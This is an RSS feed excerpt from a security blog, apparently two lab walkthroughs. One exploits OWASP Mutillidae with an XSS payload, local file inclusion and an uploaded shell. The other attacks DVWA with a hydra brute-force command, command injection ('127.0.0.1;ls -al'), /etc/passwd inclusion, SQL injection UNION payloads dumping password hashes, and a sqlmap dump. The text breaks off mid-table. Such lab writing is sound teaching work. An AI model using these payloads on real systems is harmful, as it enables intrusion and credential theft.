&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/root.png&#34; alt=&#34;root&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;a-name-a3-a-a3-cross-site-scripting-xss:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a3&#34;&gt;&lt;/a&gt; A3 Cross-Site Scripting (XSS)&lt;/h2&gt;

&lt;p&gt;XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.&lt;/p&gt;

&lt;p&gt;XSS can be either &lt;em&gt;Reflected (First Order)&lt;/em&gt; or &lt;em&gt;Persistent (Second Order)&lt;/em&gt;. Reflected XSS requires a victim to visit maliciously crafted URL, while the more dangerous persistent XSS gets stored on the server and is executed each time the vulnerable page is loaded. On the &lt;code&gt;add-to-your-blog.php&lt;/code&gt; page a user can create a new blog post. This page contains a persistent XSS vulnerability. If we create a blog post with this code:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Malicious blog post!&amp;quot;)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then upon viewing the blog post the victim&amp;rsquo;s browser will execute the malicious code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/xss.png&#34; alt=&#34;xss&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;a-name-a4-a-a4-insecure-direct-object-references:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a4&#34;&gt;&lt;/a&gt; A4 Insecure Direct Object References&lt;/h2&gt;

&lt;p&gt;A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.&lt;/p&gt;

&lt;p&gt;Mutillidae contains a few &lt;em&gt;Local File Inclusion (LFI)&lt;/em&gt; vulnerabilities. One is in the &lt;code&gt;arbitrary-file-inclusion.php&lt;/code&gt; page.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.1.66/mutillidae/index.php?page=arbitrary-file-inclusion.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Here any file specified in the &lt;code&gt;page&lt;/code&gt; variable gets included in the current page. This allows attacker to execute any php file present on the web server or view contents of sensitive non php files (logs, configuration, etc.).
In some cases this vulnerability allows to include remote php files (&lt;em&gt;Remote File Inclusion&lt;/em&gt;), however, newer PHP configurations disable this by default.&lt;/p&gt;

&lt;p&gt;Another vulnerable page is &lt;code&gt;text-file-viewer.php&lt;/code&gt;. This page allows us to view text files from a remote server, by selecting them from a drop-down list.
However, if intercept the request with burp and change &lt;code&gt;textfile&lt;/code&gt; variable, we can view the source code of any
web server files. We can view the source code of the current page:&lt;/p&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;PHP Source&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;try&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;switch&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;($_SESSION[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;security-level&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]){&lt;/span&gt;
		&lt;span style=&#34;color: #66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;This&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;insecure&lt;/span&gt;
		&lt;span style=&#34;color: #66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;This&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;insecure&lt;/span&gt;
			&lt;span style=&#34;color: #f8f8f2&#34;&gt;$lUseTokenization&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;FALSE;&lt;/span&gt;
			&lt;span style=&#34;color: #f8f8f2&#34;&gt;$lEncodeOutput&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;FALSE;&lt;/span&gt;
			&lt;span style=&#34;color: #f8f8f2&#34;&gt;$lProtectAgainstMethodTampering&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;FALSE;&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;break;&lt;/span&gt;
    		
		&lt;span style=&#34;color: #66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
		&lt;span style=&#34;color: #66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
		&lt;span style=&#34;color: #66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;4&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
   		&lt;span style=&#34;color: #66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;5&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;This&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fairly&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;secure&lt;/span&gt;
			&lt;span style=&#34;color: #f8f8f2&#34;&gt;$lUseTokenization&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;TRUE;&lt;/span&gt;
			&lt;span style=&#34;color: #f8f8f2&#34;&gt;$lEncodeOutput&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;TRUE;&lt;/span&gt;
			&lt;span style=&#34;color: #f8f8f2&#34;&gt;$lProtectAgainstMethodTampering&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;TRUE;&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;break;&lt;/span&gt;
   	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;switch&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;($_SESSION[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;security-level&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;])&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}catch(Exception&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$e){&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$CustomErrorHandler&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;FormatError($e,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Error in text file viewer. Cannot load file.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;try&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;h2 id=&#34;a-name-a5-a-a5-security-misconfiguration:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;&lt;a name=&#34;a5&#34;&gt;&lt;/a&gt; A5 Security Misconfiguration&lt;/h2&gt;

&lt;p&gt;Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.&lt;/p&gt;

&lt;p&gt;Most common security misconfiguration is relying on &amp;ldquo;hidden&amp;rdquo; directories and files. The only security here being the assumption that the attacker will not find out the names of such resources, because they have no links to them
from the main pages. However, these names can be guessed or brute forced. We have a few of them in our web server. World accessible &lt;em&gt;passwords&lt;/em&gt; folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/pass.png&#34; alt=&#34;pass&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Or &lt;em&gt;data&lt;/em&gt; folder:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/data.png&#34; alt=&#34;data&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Another common misconfiguration is unrestricted file upload. Most of the time files containing executable code (php, asp, js, etc.) are not allowed. However, if restrictions are implemented badly or not present at all, then attacker
can execute code on the server via file upload:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2015/02/03/upload.png&#34; alt=&#34;upload&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After uploading the shell, we can browse to it and execute commands on the server:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.1.66/mutillidae/upload/shell.php?cmd=dir&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Command Execution&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Volume in drive C has no label. Volume Serial Number is E2B8-4C80 Directory of C:\xampp\htdocs\mutillidae\upload 02/05/2015 11:24 AM
. 02/05/2015 11:24 AM
.. 02/05/2015 11:05 AM 132 shell.php 1 File(s) 132 bytes 2 Dir(s) 12,596,895,744 bytes free dir
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;to-be-continued:3a3e9037ddd6e7a6645f41b17becbe3a&#34;&gt;To be continued&amp;hellip;&lt;/h3&gt;

&lt;!--

## A6 Sensitive Data Exposure

Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser. 

## A7 Missing Function Level Access Control

Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization. 

## A8 Cross-Site Request Forgery (CSRF)

A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim. 

## A9 Using Components with Known Vulnerabilities

Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts. 

## A10 Unvalidated Redirects and Forwards

Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages. 
--&gt;
</description>
    </item>
    
    <item>
      <title>Exploring Damn Vulnerable Web Application</title>
      <link>http://mislusnys.github.io/2015/02/02/damn-vulnerable-web-application/</link>
      <pubDate>Mon, 02 Feb 2015 08:40:17 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/2015/02/02/damn-vulnerable-web-application/</guid>
      <description>

&lt;h2 id=&#34;intro:a278ed06f786dfe478032a0f72deba1a&#34;&gt;Intro&lt;/h2&gt;

&lt;p&gt;Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.&lt;/p&gt;

&lt;p&gt;In this report we will be exploiting the vulnerabilities that are present in the DVWA (version 1.0.7).
We will use the version that is bundled in the &lt;a href=&#34;http://sourceforge.net/projects/metasploitable/files/Metasploitable2/&#34;&gt;Metasploitable 2&lt;/a&gt; VM.
We will use the lowest security setting (&lt;em&gt;PHPIDS:disabled&lt;/em&gt; and &lt;em&gt;Security Level:low&lt;/em&gt;).&lt;/p&gt;

&lt;h2 id=&#34;1-brute-force:a278ed06f786dfe478032a0f72deba1a&#34;&gt;1. Brute Force&lt;/h2&gt;

&lt;p&gt;Our first task is to brute force HTTP based login form:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/bf.png&#34; alt=&#34;Brute Force&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;burp&lt;/code&gt; we find that parameters are transmitted via URL:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&amp;amp;password=test&amp;amp;Login=Login#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And our session data:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Using this information we can use &lt;code&gt;hydra&lt;/code&gt; to brute force the login form:&lt;/p&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Hydra bruteforce&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7
8
9&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form &amp;quot;/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&amp;quot;
Hydra v7.6 (c)2013 by van Hauser/THC &amp;amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2015-02-02 09:13:54
[DATA] 16 tasks, 1 server, 28 login tries (l:4/p:7), ~1 try per task
[DATA] attacking service http-get-form on port 80
[80][www-form] host: 192.168.52.129   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-02-02 09:13:57
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;We found valid login credentials: &lt;code&gt;admin:password&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;2-command-execution:a278ed06f786dfe478032a0f72deba1a&#34;&gt;2. Command Execution&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/ce.png&#34; alt=&#34;Command Execution&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This part of the app gives the current user the ability to ping a host.
However it uses a vulnerable piece of code:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;$cmd = shell_exec( &#39;ping  -c 3 &#39; . $target );&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Since we control the &lt;code&gt;$target&lt;/code&gt; variable, we can use &lt;code&gt;;&lt;/code&gt; or &lt;code&gt;||&lt;/code&gt; to stack commands.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;127.0.0.1;ls -al&lt;/code&gt; as input we get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.000 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.089 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.000/0.044/0.089/0.036 ms
total 20
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;3-cross-site-request-forgery:a278ed06f786dfe478032a0f72deba1a&#34;&gt;3. Cross Site Request Forgery&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/csrf.png&#34; alt=&#34;CSRF&#34; /&gt;&lt;/p&gt;

&lt;p&gt;CSRF is an attack in which an authenticated user (usually administrator) unknowingly executes a certain action.
In our case the password change operation results in the following request:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/csrf/?password_new=test&amp;amp;password_conf=test&amp;amp;Change=Change#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If we can trick an authenticated user to make this request, we can change this user&amp;rsquo;s password. Usually this is done by tricking the user into visiting a page controlled by the attacker with malicious request embedded inside &lt;code&gt;img&lt;/code&gt;, &lt;code&gt;iframe&lt;/code&gt; tags or inside malicious javascript code.&lt;/p&gt;

&lt;h2 id=&#34;4-file-inclusion:a278ed06f786dfe478032a0f72deba1a&#34;&gt;4. File Inclusion&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/fi.png&#34; alt=&#34;File Inclusion&#34; /&gt;&lt;/p&gt;

&lt;p&gt;This one is pretty straight forward. We can change the &lt;code&gt;page&lt;/code&gt; variable to display sensitive information:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/vulnerabilities/fi/?page=/etc/passwd&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh 
sys:x:3:3:sys:/dev:/bin/sh 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/bin/sh 
man:x:6:12:man:/var/cache/man:/bin/sh 
lp:x:7:7:lp:/var/spool/lpd:/bin/sh 
mail:x:8:8:mail:/var/mail:/bin/sh 
news:x:9:9:news:/var/spool/news:/bin/sh 
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh 
proxy:x:13:13:proxy:/bin:/bin/sh 
www-data:x:33:33:www-data:/var/www:/bin/sh 
backup:x:34:34:backup:/var/backups:/bin/sh 
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh 
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh 
libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
dhcp:x:101:102::/nonexistent:/bin/false 
syslog:x:102:103::/home/syslog:/bin/false 
klog:x:103:104::/home/klog:/bin/false 
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin 
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash 
bind:x:105:113::/var/cache/bind:/bin/false 
postfix:x:106:115::/var/spool/postfix:/bin/false 
ftp:x:107:65534::/home/ftp:/bin/false 
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false 
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false 
distccd:x:111:65534::/:/bin/false 
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash 
service:x:1002:1002:,,,:/home/service:/bin/bash 
telnetd:x:112:120::/nonexistent:/bin/false 
proftpd:x:113:65534::/var/run/proftpd:/bin/false 
statd:x:114:65534::/var/lib/nfs:/bin/false 
snmp:x:115:65534::/var/lib/snmp:/bin/false 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;5-1-sql-injection:a278ed06f786dfe478032a0f72deba1a&#34;&gt;5.1 SQL Injection&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/sqli.png&#34; alt=&#34;SQLI&#34; /&gt;&lt;/p&gt;

&lt;p&gt;User input is unfiltered and used in the following query:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;If we enter &lt;code&gt;&#39; or 1=1-- -&lt;/code&gt; as an id then the query becomes:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39; or 1=1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;which makes WHERE clause always true and shows us all the records:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39;or 1=1-- -
First name: admin
Surname: admin

ID: &#39;or 1=1-- -
First name: Gordon
Surname: Brown

ID: &#39;or 1=1-- -
First name: Hack
Surname: Me

ID: &#39;or 1=1-- -
First name: Pablo
Surname: Picasso

ID: &#39;or 1=1-- -
First name: Bob
Surname: Smith
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using &lt;code&gt;UNION&lt;/code&gt; keyword we can extract any information available to the app&amp;rsquo;s user from the database.
&lt;code&gt;&#39; union select database(),null -- -&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39; union select database(),null -- -
First name: dvwa
Surname: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;&#39; union select table_name,null from information_schema.tables where table_schema=&#39;dvwa&#39;-- -&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID:  &#39; union select table_name,null from information_schema.tables where table_schema=&#39;dvwa&#39;-- -
First name: guestbook
Surname: 

ID:  &#39; union select table_name,null from information_schema.tables where table_schema=&#39;dvwa&#39;-- -
First name: users
Surname: 

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;&#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: user_id
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: first_name
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: last_name
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: user
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: password
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: avatar
Surname: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;&#39; union select user, password from users-- -&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39; union select user, password from users-- -
First name: admin
Surname: 098f6bcd4621d373cade4e832627b4f6

ID: &#39; union select user, password from users-- -
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: &#39; union select user, password from users-- -
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: &#39; union select user, password from users-- -
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: &#39; union select user, password from users-- -
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks like the passwords are MD5 hashed. However, they are easily found to be &lt;code&gt;test&lt;/code&gt;, &lt;code&gt;abc123&lt;/code&gt;, &lt;code&gt;charley&lt;/code&gt;, &lt;code&gt;letmein&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; respectively.&lt;/p&gt;

&lt;h2 id=&#34;5-2-sql-injection-blind:a278ed06f786dfe478032a0f72deba1a&#34;&gt;5.2 SQL Injection(Blind)&lt;/h2&gt;

&lt;p&gt;The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
We can use &lt;code&gt;sqlmap&lt;/code&gt; to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)&lt;/p&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;SQLMap Table Dump&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;sqlmap -u &amp;quot;http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&amp;amp;Submit=Submit#&amp;quot; --cookie=&amp;quot;security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&amp;quot; --dump

Database: dvwa
Table: users
[5 entries]
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| user_id | user    | avatar                                                | password                         | last_name | first_name |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| 1       | admin   | http://192.168.52.129/dvwa/hackable/users/admin.jpg   | 098f6bcd4621d373cade4e832627b4f6 | admin     | admin      |
